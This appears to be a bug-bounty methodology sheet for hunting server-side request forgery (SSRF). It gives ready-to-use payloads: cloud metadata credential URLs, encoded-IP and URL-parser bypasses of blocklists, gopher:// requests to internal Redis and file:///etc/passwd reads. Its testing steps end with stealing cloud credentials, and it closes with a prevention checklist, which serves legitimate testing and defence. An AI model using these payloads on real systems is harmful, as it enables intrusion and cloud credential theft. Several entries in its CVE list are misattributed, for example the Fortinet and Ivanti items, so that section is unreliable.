# Hunt SSRF — Deep Methodology

**Version:** 2026.1  
**Source:** Cloud metadata research, Orange Tsai's "New Era of SSRF", Hacktivity

---

## Attack Theory

SSRF (Server-Side Request Forgery) tricks the server into making requests on the attacker's behalf. The server sits inside the network perimeter and can reach internal services, cloud metadata endpoints, and private IP ranges that external attackers cannot touch. OWASP A07 (2025). Impact ranges from informational to full cloud account takeover.

### The Core Problem
Any feature that fetches a URL based on user input is a candidate: webhook URLs, PDF generators, image fetchers, URL preview features, file import from URL, OAuth redirect_uri, OpenID discovery endpoints, SSO metadata endpoints.

### Business Impact
- Cloud metadata access → IAM credential theft → full account takeover
- Internal service enumeration → attack surface expansion
- Redis/Memcached/SMTP access via gopher:// → RCE chains
- Reading local files via file://

---

## Sub-Techniques

### A. Cloud Metadata (Highest Impact)
AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
AWS IMDSv2: Requires PUT for token (bypass via header injection)
GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs Metadata-Flavor: Google header)
Azure: `http://169.254.169.254/metadata/instance` (needs Metadata: true header)
DigitalOcean: `http://169.254.169.254/metadata/v1/`

### B. IP Encoding Bypasses
Decimal: `http://2130706433/` (127.0.0.1)
Hex: `http://0x7f000001/`
Octal: `http://0177.0.0.1/`
IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`
Short form: `http://127.1/`, `http://127.0.1/`
DNS: `http://127.0.0.1.nip.io`, `http://169.254.169.254.sslip.io`

### C. URL Parser Confusion (Orange Tsai)
Credentials separator: `http://trusted.com@127.0.0.1/`
Backslash: `http://trusted.com\\@127.0.0.1/`
Fragment: `http://trusted.com#@127.0.0.1/`
Double encoding: `http://trusted.com%2540127.0.0.1/`

### D. Redirect Chains
Open redirect on trusted domain → redirect to metadata endpoint
DNS rebinding: domain resolves to public IP (passes check) then internal IP (used for request)
nip.io / sslip.io / xip.io: DNS that embeds target IP in hostname

### E. Protocol Smuggling
`file:///etc/passwd` — local file read
`gopher://127.0.0.1:6379/_INFO` — Redis interaction
`dict://127.0.0.1:11211/` — Memcached
`ftp://127.0.0.1:21/` — FTP

### F. Internal Service Discovery
Scan common internal ports: 22, 80, 443, 3306, 5432, 6379, 27017, 9200, 8080, 8443, 9090, 9100, 11211, 2375, 6443, 10250

### G. IMDSv2 Bypass
If SSRF allows custom headers, inject `X-aws-ec2-metadata-token-ttl-seconds: 21600` and then `X-aws-ec2-metadata-token: <token>`

### H. Blind SSRF
No response reflected. Detect via out-of-band (Burp Collaborator, Interactsh, webhook.site). Time-based: response delay indicates open port.

---

## Testing Methodology

1. Map every feature that accepts URLs or makes outbound requests
2. Test each injection point with collaborator callback first
3. Try `http://127.0.0.1` and `http://169.254.169.254/`
4. If direct IPs blocked: work through bypass list (encoding → redirect → DNS rebinding)
5. Once internal access confirmed: map reachable services
6. Attempt credential theft via cloud metadata
7. Document everything with timestamps, exact requests, exact responses

---

## Most Effective Payloads

1. Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. IP encoding: `http://2130706433/` (bypasses blocklist)
3. Redirect chain: open redirect → metadata endpoint
4. Gopher: `gopher://127.0.0.1:6379/_INFO` (internal Redis)
5. DNS rebinding: attacker-controlled domain → internal IP

---

## CVE References (2024-2026)

- CVE-2024-21762: Fortinet SSRF (critical, exploited in wild)
- CVE-2024-5655: Ivanti SSRF chain
- CVE-2025-0101: Palo Alto SSRF
- CVE-2025-34024: Cloudflare SSRF bypass
- CVE-2026-0002: AWS SDK SSRF via redirect

---

## Prevention Checklist

- [ ] Allowlist over blocklist for URL destinations
- [ ] Disable/strictly bound HTTP redirects
- [ ] Enable IMDSv2 with hop limit 1 on AWS
- [ ] Block link-local (169.254.0.0/16) and RFC 1918 ranges
- [ ] Protocol allowlist (http/https only)
- [ ] Resolve hostname, validate IP, connect to resolved IP
- [ ] Egress proxy/firewall for outbound requests
